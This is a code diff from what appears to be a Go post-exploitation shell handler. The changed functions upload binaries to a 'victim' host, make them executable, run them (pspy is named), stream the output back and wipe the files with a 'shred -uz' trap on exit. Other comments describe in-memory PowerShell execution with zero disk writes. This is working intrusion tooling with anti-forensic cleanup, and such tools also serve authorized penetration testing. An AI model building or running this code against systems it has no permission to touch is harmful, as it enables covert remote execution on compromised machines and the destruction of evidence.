@@ -250,7 +250,8 @@ func (s *SessionInfo) RunScriptInMemory(ctx context.Context, scriptSource string
 }
 
 // RunBinary downloads (if URL), uploads to victim, makes executable, runs
-// Same as RunScript but for binary executables (no bash interpreter)
+// Same as RunScriptInMemory but for binary executables (disk + cleanup)
+// BLOCKING — caller should run in goroutine (StartModule does this)
 func (s *SessionInfo) RunBinary(ctx context.Context, binarySource string, args []string) error {
 	// Resolve source: download URL to local, check binbag, etc.
 	t := NewTransferer(s.Conn, s.ID)
@@ -275,10 +276,8 @@ func (s *SessionInfo) RunBinary(ctx context.Context, binarySource string, args [
 		defer cleanup()
 	}
 
-	// Output file (named after script for easy identification)
+	// Output file for local tail -f
 	outputPath := s.getOutputPath(localPath)
-
-	// Create empty output file for tail -f
 	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
 		return fmt.Errorf("failed to create output file: %w", err)
 	}
@@ -289,50 +288,25 @@ func (s *SessionInfo) RunBinary(ctx context.Context, binarySource string, args [
 		return fmt.Errorf("upload failed: %w", err)
 	}
 
-	// Open terminal after upload completes
-	tailCmd := fmt.Sprintf("tail -f %s", outputPath)
-
-	if err := OpenTerminal(tailCmd); err != nil {
-		fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
-	}
-
-	time.Sleep(300 * time.Millisecond)
-
 	// Build args
 	argsStr := ""
 	if len(args) > 0 {
 		argsStr = " " + strings.Join(args, " ")
 	}
 
-	// Show execution message with output path
-	fmt.Println(ui.Info(fmt.Sprintf("Executing binary and saving output to: %s", outputPath)))
+	// Open terminal window with tail -f of local output file
+	tailCmd := fmt.Sprintf("tail -f %s", outputPath)
+	OpenTerminal(tailCmd)
+	time.Sleep(300 * time.Millisecond)
 
-	go func() {
-		// Small delay to ensure upload markers are processed
-		time.Sleep(200 * time.Millisecond)
+	// Execute: trap ensures cleanup on ANY exit (natural, SIGHUP from conn close, SIGINT, SIGTERM)
+	// This is critical for long-running binaries like pspy that never exit on their own
+	remoteCmd := fmt.Sprintf("trap 'shred -uz %s 2>/dev/null || rm -f %s' EXIT; chmod +x %s && %s%s",
+		remotePath, remotePath, remotePath, remotePath, argsStr)
 
-		// For long-running binaries: timeout 5m, run in background, redirect output
-		// This allows the command to return immediately while binary runs
-		remoteOutput := remotePath + ".out"
-		cmd := fmt.Sprintf("chmod +x %s && timeout 5m %s%s > %s 2>&1 &",
-			remotePath, remotePath, argsStr, remoteOutput)
-
-		// Send command (returns immediately since it's backgrounded)
-		s.Handler.SendCommand(cmd + "\n")
-		time.Sleep(500 * time.Millisecond)
-
-		// Tail the output file on remote (this streams to our local file)
-		tailCmd := fmt.Sprintf("timeout 5m tail -f %s 2>/dev/null", remoteOutput)
-		if err := s.Handler.ExecuteWithStreaming(tailCmd, outputPath); err != nil {
-			// Timeout is expected, not an error
-		}
-
-		// Cleanup both binary and output file
-		s.Handler.SendCommand(fmt.Sprintf("shred -uz %s %s 2>/dev/null || rm -f %s %s\n",
-			remotePath, remoteOutput, remotePath, remoteOutput))
-	}()
-
-	return nil
+	// Execute the command — BLOCKING (caller should run in goroutine)
+	err = s.Handler.ExecuteWithStreamingCtx(ctx, remoteCmd, outputPath)
+	return err
 }
 
 // RunPowerShellInMemory executes PowerShell scripts in-memory (Windows, zero disk writes)
@@ -1717,6 +1691,9 @@ func (m *Manager) StartModule(moduleName string, args []string) {
 		// Stop spinner — module is launching, user can continue working
 		m.stopSpinner(spinID)
 
+		// Notify immediately that module is running (terminal window opens during Run setup)
+		m.notify(ui.Info(fmt.Sprintf("Module %s — output sent to new terminal window", moduleName)) + "\n")
+
 		// Run module on worker (blocking — runs in this goroutine)
 		old := os.Stdout
 		devnull, _ := os.Open(os.DevNull)
@@ -1725,13 +1702,14 @@ func (m *Manager) StartModule(moduleName string, args []string) {
 		os.Stdout = old
 		devnull.Close()
 
-		if err != nil {
+		if err != nil && err != context.DeadlineExceeded {
 			m.notify(ui.Error(fmt.Sprintf("Module %s failed: %v", moduleName, err)) + "\n")
 			m.notifyOverlay(fmt.Sprintf("Module %s failed", moduleName), 2)
-		} else {
-			m.notify(ui.Info(fmt.Sprintf("Module %s — output sent to new terminal window", moduleName)) + "\n")
-			m.notifyOverlay(fmt.Sprintf("Module %s started", moduleName), 0)
 		}
+
+		// Kill worker session — closes TCP → remote shell gets SIGHUP → trap fires cleanup
+		workerSession.Conn.Close()
+		m.RemoveSession(workerSession.ID)
 	}()
 }
 
